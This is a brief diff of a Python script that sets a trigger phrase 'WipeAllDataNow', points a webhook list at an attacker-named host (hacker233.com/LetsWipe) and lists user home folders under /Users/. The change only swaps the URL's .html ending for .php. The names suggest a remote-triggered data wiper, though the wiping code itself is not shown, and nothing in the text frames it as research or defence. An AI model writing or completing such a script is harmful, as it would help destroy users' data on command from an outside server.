@@ -6,7 +6,7 @@ import time
 magicWord = 'WipeAllDataNow'
 
 # Set web server address
-webHooks = ['https://hacker233.com/LetsWipe.html']
+webHooks = ['https://hacker233.com/LetsWipe.php']
 
 # Get users list from the system
 users = os.listdir('/Users/')
